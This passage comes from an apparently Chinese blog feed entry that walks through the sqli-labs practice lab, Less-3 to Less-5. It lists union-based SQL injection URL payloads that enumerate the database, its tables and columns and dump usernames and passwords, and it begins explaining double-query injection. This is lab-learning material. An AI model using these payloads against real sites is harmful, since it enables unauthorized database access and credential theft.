operator">-</span><span class="token number">1</span>'<span class="token punctuation">)</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span>security<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201106195450005-1604667081398.png" alt="image-20201106195450005" loading="lazy"></p><p><strong>爆列</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">') union select 1,group_concat(column_name) ,3 from information_schema.columns where table_name='</span>users'<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201106195750781-1604667081399.png" alt="image-20201106195750781" loading="lazy"></p><p><strong>爆数据</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>'<span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> users<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201106200349876-1604667081399.png" alt="image-20201106200349876" loading="lazy"></p><p>或者 查询数据</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>'<span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>username<span class="token punctuation">,</span>password <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">3</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201106200631160-1604667081399.png" alt="image-20201106200631160" loading="lazy"></p><h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><p>根据提示，知道这是双引号注入</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>'没错误?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">"错误发现是双引号加括号形成的查询语句?id=1"</span><span class="token punctuation">)</span><span class="token comment">--+正确回显</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201106211359829.png" alt="image-20201106211359829" loading="lazy"></p><p>接下来又是常规操作</p><p><strong>爆库</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>"<span class="token punctuation">)</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201106211719441.png" alt="image-20201106211719441" loading="lazy"></p><p>可以得到数据库名字security</p><p><strong>爆表</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>"<span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'security'</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201106211827101.png" alt="image-20201106211827101" loading="lazy"></p><p><strong>爆列</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>"<span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'users'</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201106211907985.png" alt="image-20201106211907985" loading="lazy"></p><p><strong>爆数据</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>"<span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> users<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201106211943328.png" alt="image-20201106211943328" loading="lazy"></p><p>或者 查询数据</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">") union select 1,username,password from users where id=3--+or?id=3"</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201106212009822.png" alt="image-20201106212009822" loading="lazy"></p><h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>正常?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">'错误?id=1'</span><span class="token comment">--+正常但是注入不出库名</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>根据提示可知该使用双查询注入</p><p><strong>子查询</strong></p><p>在说双查询之前，先介绍一下子查询。</p><p>查询：任何SQL语句都是查询。但此术语一般指SELECT语句。<br>SQL还允许创建子查询（subquery），即嵌套在其他查询中的查询。</p><p>举个简单的例子，Select concat((select database()));<br>执行的时候，先从子查询进行。因此执行select database()这个语句就会把当前的数据库的名称查出来，然后把结果传入到concat函数。这个函数是用来连接的。比如数据库名字叫’a’和’b’，那么concat(‘a’,’b’)后，结果就是ab了。</p><p>j简单来说，双查询注入其实就是一个select语句中再嵌套一个select语句，嵌套的这个语句称作子查询，例如：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> concat<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201107171718737.png" alt="image-20201107171718737" loading="lazy"></p><p>后续注入，需要先了解count()、rand()、floor()、concat()这三个函数的功能以及group by语句的用法。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">rand<span class="token punctuation">(</span><span class="token punctuation">)</span>函数 <span class="token comment">//返回0~1间的小数。</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">floor<span class="token punctuation">(</span><span class="token punctuation">)</span>函数 <span class="token comment">//向下取整。向上取整：ceiling()</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span>函数 <span class="token comment">//汇总函数：返回匹配指定条件的行数</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">group</span> <span class="token keyword">by</span>子句 <span class="token comment">//根据一个或多个列对结果集进行分组</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h2><h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h2><h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h2><h2 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h2><h2 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;sqli-labs1-20&quot;&gt;&lt;a href=&quot;#sqli-labs1-20&quot; class=&quot;headerlink&quot; title=&quot;sqli_labs1-20&quot;&gt;&lt;/a&gt;sqli_labs1-20&lt;/h1&gt;&lt;p&gt;学习sql注入前可以去&lt;a href=&quot;https:</summary>
      
    
    
    
    <category term="sqli-labs1-20" scheme="http://www.blog.yln956.top/categories/sqli-labs1-20/"/>
    
    
    <category term="sqlilabs" scheme="http://www.blog.yln956.top/tags/sqlilabs/"/>
    
    <category term="sql注入" scheme="http://www.blog.yln956.top/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
</feed>
